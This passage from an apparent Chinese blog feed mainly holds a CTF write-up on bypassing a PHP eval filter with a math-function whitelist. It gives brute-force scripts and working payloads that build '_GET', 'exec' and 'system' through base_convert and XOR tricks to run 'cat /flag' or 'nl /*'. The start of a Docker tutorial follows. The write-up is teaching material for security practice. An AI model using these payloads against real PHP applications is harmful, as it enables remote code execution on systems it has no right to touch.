class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br></code></pre></td></tr></table></figure><p>白名单函数（都为math函数）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br><span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <span class="hljs-comment">//提取payload中函数名及变量名</span><br></code></pre></td></tr></table></figure><blockquote><p>php参考手册中提到，用于匹配php有效变量名，可以使用正则<code>[a-zA-Z_/x7f-/xff][a-zA-Z0-9_/x7f-/xff]*</code> 因此payload中若使用变量，命名必须在白名单函数中选择,如果是数组索引也可以用纯数字(不符合变量名命名法则)</p></blockquote><h3 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br></code></pre></td></tr></table></figure><blockquote><p>eval函数参数若是字符串，必须符合php代码语法，因此可以插入多行代码</p></blockquote><h2 id="0x01-利用math函数构造函数名"><a href="#0x01-利用math函数构造函数名" class="headerlink" title="0x01 利用math函数构造函数名"></a>0x01 利用math函数构造函数名</h2><h3 id="进制转换–获取小写字母"><a href="#进制转换–获取小写字母" class="headerlink" title="进制转换–获取小写字母"></a>进制转换–获取小写字母</h3><p>利用到进制转换，从11进制到36进制均有小写字母，在保证转换结果简洁及纯数字的情况下，选择36进制转10进制(36进制含a-z)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//先反向</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;cat&quot;</span>,<span class="hljs-number">36</span>,<span class="hljs-number">10</span>);<span class="hljs-comment">//15941</span><br><span class="hljs-comment">//这样就可以用纯数字通过三十六进制转换得到纯字母字符串了</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">15941</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>);<span class="hljs-comment">//cat</span><br></code></pre></td></tr></table></figure><h3 id="字符串异或–获取特殊字符及其组合"><a href="#字符串异或–获取特殊字符及其组合" class="headerlink" title="字符串异或–获取特殊字符及其组合"></a>字符串异或–获取特殊字符及其组合</h3><h4 id="异或性质"><a href="#异或性质" class="headerlink" title="异或性质"></a>异或性质</h4><ol><li>结合律a ^ b ^ c &#x3D; a ^ c ^ b</li><li>交换律a ^ b &#x3D; b ^ a</li><li>数值交换（能交换 a 与 b 的值）a &#x3D; a ^ b; b &#x3D; a ^ b; a &#x3D; a ^ b;</li><li>a^b^b&#x3D;a</li></ol><h4 id="php字符串异或分为两种情况"><a href="#php字符串异或分为两种情况" class="headerlink" title="php字符串异或分为两种情况"></a>php字符串异或分为两种情况</h4><ul><li><p>长度一致的字符串异或，对应字符各自转换成ascii码值异或后得到新字符，组成新字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;tan&quot;</span>^<span class="hljs-string">&quot;*\/&quot;</span>;<span class="hljs-comment">//^=A</span><br></code></pre></td></tr></table></figure></li><li><p>长度不一致的字符串异或，按最短的字符串长度按位异或</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;tan&quot;</span>^<span class="hljs-string">&quot;*&quot;</span>;<span class="hljs-comment">//^</span><br></code></pre></td></tr></table></figure></li></ul><p>异或字符串可以构造出新字符，但只用白名单的函数名的话，大多是ascii码值接近的小写字母，异或后得到的也多是ascii码值小的<u>不可见字符</u>，不够全面。</p><p>因此可以利用<code>a^b^b=a</code>这个性质，将a看作要获取的特殊字符，b为白名单函数名异或组合,靠脚本爆破出可以通过进制转换表示的<code>a^b</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//爆破脚本</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$whitelist1</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>,<span class="hljs-string">&#x27;...&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br><span class="hljs-variable">$whitelist2</span> = [ <span class="hljs-string">&#x27;abs&#x27;</span>,<span class="hljs-string">&#x27;...&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<span class="hljs-comment">//与whitelist1相同</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$whitelist1</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$i</span>):<br>   <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$whitelist2</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>):<br>       <span class="hljs-keyword">echo</span> <span class="hljs-variable">$k</span>^<span class="hljs-variable">$i</span>^<span class="hljs-string">&quot; /&quot;</span>;<span class="hljs-comment">//a^b</span><br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;   &quot;</span> . <span class="hljs-variable">$i</span> . <span class="hljs-string">&quot; &quot;</span> . <span class="hljs-variable">$k</span>;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>   <span class="hljs-keyword">endforeach</span>;<br><span class="hljs-keyword">endforeach</span>;<br></code></pre></td></tr></table></figure><blockquote><p>输出结果说明</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">16</span>   tanh exp <span class="hljs-comment">//意思是&quot; /&quot;^tanh^exp=&quot;16&quot;</span><br><span class="hljs-comment">//因此要想得到&quot; /&quot;只要</span><br><span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">22</span>)^tanh^exp  <span class="hljs-comment">//即&quot; /&quot;^tanh^exp^tanh^exp=&quot; /&quot;^0=&quot; /&quot;</span><br><span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-number">10</span>)^tanh^exp<span class="hljs-comment">//也可以</span><br></code></pre></td></tr></table></figure><h4 id="注意⚠️"><a href="#注意⚠️" class="headerlink" title="注意⚠️"></a>注意⚠️</h4><ul><li><p>不能直接<code>16^tanh^exp</code> ，这样的16会被当作int型数据处理，使用进制转换函数可以转成string类型，同时选取的数值转成16进制不能有字母。</p></li><li><p>根据长度不一致字符串异或的运算规则，白名单中最短的是pi，因此特殊字符组合尽量不超过两个，如果一定要更长的特殊字符组合，要删除白名单中较短的函数名，不然得到的结果都是截断的，而特殊字符组合越长，白名单中可用函数名也就越少，出现纯数字结果的可能性也越低，这也是为什么这里不能直接构造<code>system(&#39;cat /flag&#39; )</code></p></li></ul></blockquote><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>一旦将特殊字符改成大写字母或与下划线的组合，输出中几乎没有纯数字结果。</p><h3 id="引入数字字符串的异或–构造下划线和大写字母组合"><a href="#引入数字字符串的异或–构造下划线和大写字母组合" class="headerlink" title="引入数字字符串的异或–构造下划线和大写字母组合"></a>引入数字字符串的异或–构造下划线和大写字母组合</h3><p>上面的异或结果可以归纳成<code>特殊字符组合^白名单函数1^白名单函数2=纯数字字符串</code>。</p><p>因此可以合理推测<code>纯数字字符串^白名单函数1^白名单函数2=特殊字符组合</code>。</p><p>纯字符串如果用<code>dechex</code>的方式转换，非常浪费payload长度，可以利用字符串拼接时类型转换的特性。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$i</span>=(<span class="hljs-number">1</span>).(<span class="hljs-number">2</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$i</span>);<span class="hljs-comment">//string(2) &quot;12&quot;</span><br></code></pre></td></tr></table></figure><p>爆破脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$payload</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;...&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$k</span>&lt;<span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$k</span>++)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; <span class="hljs-number">9</span>; <span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$j</span> &lt;=<span class="hljs-number">9</span>;<span class="hljs-variable">$j</span>++)&#123;<br>            <span class="hljs-variable">$exp</span> = <span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>] ^ <span class="hljs-variable">$i</span>.<span class="hljs-variable">$j</span>;<span class="hljs-comment">//$i $j字符串拼接得到&quot;00&quot;-&quot;99&quot;</span><br>            <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$payload</span>[<span class="hljs-variable">$k</span>].<span class="hljs-string">&quot;^<span class="hljs-subst">$i</span><span class="hljs-subst">$j</span>&quot;</span>.<span class="hljs-string">&quot;==&gt;<span class="hljs-subst">$exp</span>&quot;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>由于pi的存在，构造出来的组合都是两个字符，会惊喜地发现大多数为下划线和大写字母组合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">结果中 tanh^<span class="hljs-number">15</span>==&gt;ET is_nan^<span class="hljs-number">64</span>==&gt;_G <br>因此构造 (is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>)) 正是 <span class="hljs-string">&quot;_G&quot;</span>.<span class="hljs-string">&quot;ET&quot;</span> ，即 <span class="hljs-string">&quot;_GET&quot;</span><br></code></pre></td></tr></table></figure><p>再根据PHP可变变量的特性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));<span class="hljs-comment">//_GET</span><br><span class="hljs-variable">$$pi</span>&#123;<span class="hljs-number">1</span>&#125;;<span class="hljs-comment">//$_GET[1]</span><br></code></pre></td></tr></table></figure><p>{}可以代替[],这样就可以通过get传参数，缩短payload长度</p></blockquote><p>$_GET[1]接收的数值会转换成字符串，因此即使拼接到了代码中也无法执行</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214590.jpg" alt="1"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214171.jpg" alt="2"></p><p>因此需要像eval这样的函数执行字符串php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));<span class="hljs-variable">$pi</span>=<span class="hljs-variable">$$pi</span>;<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">42633</span>,<span class="hljs-number">19</span>,<span class="hljs-number">33</span>)(<span class="hljs-variable">$pi</span>&#123;<span class="hljs-number">1</span>&#125;)&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>也可以利用php可变函数的特性：<code>($a)[system]($_GET[1])</code> –&gt;php会将<code>$_GET[1]</code>的内容当作参数传入system函数执行。<code>$a</code>只要求是个变量，在这题的背景下可以用<code>$pi</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=(is_nan^(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)).(tan^(<span class="hljs-number">1</span>).(<span class="hljs-number">5</span>));<span class="hljs-variable">$pi</span>=<span class="hljs-variable">$$pi</span>;<span class="hljs-variable">$pi</span>&#123;<span class="hljs-number">0</span>&#125;(<span class="hljs-variable">$pi</span>&#123;<span class="hljs-number">1</span>&#125;)&amp;<span class="hljs-number">0</span>=system&amp;<span class="hljs-number">1</span>=cat /flag<br></code></pre></td></tr></table></figure><h2 id="0x02-payload缩短技巧"><a href="#0x02-payload缩短技巧" class="headerlink" title="0x02 payload缩短技巧"></a>0x02 payload缩短技巧</h2><h3 id="通过外部传参数"><a href="#通过外部传参数" class="headerlink" title="通过外部传参数"></a>通过外部传参数</h3><ul><li><p>使用$_GET[1]，索引选择最简短且符合题目要求的数字1，系统命令通过1传参，不占有payload</p></li><li><p>使用getallheaders获取请求头信息，将索引设成1，将获取header中key为1的value，再将这个结果传入exec函数，但这个payload较长，超过60字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$pi</span>=base_convert,<span class="hljs-variable">$pi</span>(<span class="hljs-number">696468</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-variable">$pi</span>(<span class="hljs-number">8768397090111664438</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>)()&#123;<span class="hljs-number">1</span>&#125;)<br><span class="hljs-comment">//base_convert(696468,10,36) -&gt; exec</span><br><span class="hljs-comment">//base_convert(8768397090111664438,10,30) -&gt; getallheaders</span><br><span class="hljs-comment">//exec(getallheaders()&#123;1&#125;)</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="穷举进制转换"><a href="#穷举进制转换" class="headerlink" title="穷举进制转换"></a>穷举进制转换</h3><p>如果要得到flag字符串，10进制转36进制需要数字为727432,有6位，而通过脚本穷举+正则匹配筛选可以发现32进制转22进制时，只需要4位数字就可以得到flag</p><p>脚本如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$payload</span>=<span class="hljs-string">&quot;flag&quot;</span>;<br><span class="hljs-variable">$num</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$tmp</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$i</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$tmp</span>)-<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>&gt;<span class="hljs-variable">$num</span>)<br>        <span class="hljs-variable">$num</span>=<span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-variable">$res</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">11</span>+<span class="hljs-variable">$num</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">36</span>;<span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span>=<span class="hljs-number">10</span>;<span class="hljs-variable">$j</span>&lt;=<span class="hljs-number">36</span>;<span class="hljs-variable">$j</span>++) &#123;<br>        <span class="hljs-variable">$res</span>.= <span class="hljs-variable">$i</span> . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$j</span> . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-variable">$payload</span>, <span class="hljs-variable">$i</span>, <span class="hljs-variable">$j</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">2</span>*<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\d&#123;2&#125;\s\d&#123;2&#125;\s\d&#123;&#x27;</span>.<span class="hljs-variable">$i</span>.<span class="hljs-string">&#x27;&#125;\n/&#x27;</span>,<span class="hljs-variable">$res</span>,<span class="hljs-variable">$mc</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>==<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$mc</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072214513.jpg" alt="image-20220809211543165"></p><blockquote><p><code>base_convert(5648,32,22)--&gt;&#39;flag&#39;</code></p></blockquote><h2 id="0x03-一些尝试"><a href="#0x03-一些尝试" class="headerlink" title="0x03 一些尝试"></a>0x03 一些尝试</h2><h3 id="花括号"><a href="#花括号" class="headerlink" title="花括号"></a>花括号</h3><p>上面的payload几乎都使用了花括号来访问数组，如果题目过滤了花括号，那么是否可以在保证长度尽可能小的情况下,构造无花括号payload</p><blockquote><p>PHP7.4不再能够使用花括号来访问<a href="https://www.yuanmaluntan.com/tags-11630.html">数组</a>或者字符串的偏移.需要将{}修改成[] （本题环境为7.3.9）</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072226764.jpg" alt="4"></p><h3 id="无花括号payload"><a href="#无花括号payload" class="headerlink" title="无花括号payload"></a>无花括号payload</h3><p>由于传入的是字符串，反引号不能被识别为系统命令执行，因此使用名称较短的exec函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure><p>但是这样就不能外部传入命令来节省payload，因此要求执行的命令足够短，这里使用nl命令</p><p>linux下执行<code>nl /*</code>扫描根目录，会打印根目录下所有文件，不会目录向下递归</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072228668.jpg" alt="6"></p><blockquote><p><code>nl [参数] [文件]</code></p><p>nl命令是一个很好用的编号过滤工具。该命令可以读取 File 参数（缺省情况下标准输入），计算输入中的行号，将计算过的行号写入标准输出。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">aff   rad2deg sin <span class="hljs-comment">//`nl</span><br><span class="hljs-number">16</span>   exp tan   <span class="hljs-comment">// /</span><br><span class="hljs-number">9</span>f   cos pi  <span class="hljs-comment">//*`</span><br>  <br>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">2815</span>)^rad2deg^sin).((<span class="hljs-number">1</span>).(<span class="hljs-number">6</span>)^exp^tan).(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">159</span>)^cos^pi) <span class="hljs-comment">//`nl /*`</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">ca   abs log <span class="hljs-comment">//nl</span><br><span class="hljs-number">164</span>   exp tan <span class="hljs-comment">// /*</span><br>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">202</span>)^abs^log).(<span class="hljs-title function_ invoke__">hexdec</span>(a4)^exp^tan) <span class="hljs-comment">//nl /*</span><br></code></pre></td></tr></table></figure><p>用上面的穷举脚本找出最适合的进制转换exec</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;34 23 22950&quot;</span>&#125;<br><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">22950</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>) <span class="hljs-comment">//exec</span><br></code></pre></td></tr></table></figure><p>无花括号payload</p><p>长度:70</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-number">22950</span>,<span class="hljs-number">23</span>,<span class="hljs-number">34</span>)((<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-number">202</span>)^abs^log).((<span class="hljs-number">1</span>).(<span class="hljs-number">6</span>).(<span class="hljs-number">4</span>)^exp^tan))<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072227751.jpg" alt="7"></p><p>本地php7.4以上也能成功执行(但是php8以后有个fatal error 不能使用未定义常量，直接用函数名异或的时候会识别成常量)</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072229986.jpg" alt="9"></p><p>不过这边尝试了下带花括号的，似乎也能成功，花括号只在php8以后才被定义为<strong>Fatal error</strong></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072227919.jpg" alt="11"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072227457.jpg" alt="12"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker学习</title>
      <link href="/2022/01/12/docker%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/01/12/docker%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="docker学习"><a href="#docker学习" class="headerlink" title="docker学习"></a>docker学习</h1><h2 id="dockerfile启动环境"><a href="#dockerfile启动环境" class="headerlink" title="dockerfile启动环境"></a>dockerfile启动环境</h2><p>事先编写好dockerfile，在其所在目录下打开终端，从dockerfile建立镜像</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">docker <span class="hljs-keyword">build </span>-t nginx:<span class="hljs-built_in">v1</span> . <br></code></pre></td></tr></table></figure><blockquote><p>-t snginx:v1 给新构建的镜像取名为nginx，并设定版本为 v1 。</p><p>⚠️不要忘记版本号后空格加一个<code>.</code> 最后的<code>.</code>代表本次执行的上下文路径</p><p>上下文路径:是指 docker 在构建镜像，有时候想要使用到本机的文件（比如复制），docker build 命令得知这个路径后，会将路径下的所有内容打包。默认上下文路径就是 Dockerfile 所在的位置a</p><p>⚠️上下文路径下不要放无用的文件，因为会一起打包发送给 docker 引擎，如果文件过多会造成过程缓慢。</p></blockquote><p>使用<code>docker images</code>命令查看镜像是否创建成功，若成功会发现有一个刚创建的nginx镜像</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">REPOSITORY</span>    TAG   IMAGE ID       CREATED        SIZE<br><span class="hljs-attribute">nginx</span>         v1   <span class="hljs-number">3</span>efd9464e2a0   <span class="hljs-number">2</span> hours ago    <span class="hljs-number">134</span>MB<br></code></pre></td></tr></table></figure><p>利用该镜像启动容器，注意端口映射</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker <span class="hljs-built_in">run</span> -p 本地端口：容器端口 镜像名称<br>docker <span class="hljs-built_in">run</span>  --name docker_nginx_v1   -d -p 127.0.0.1:5001:80 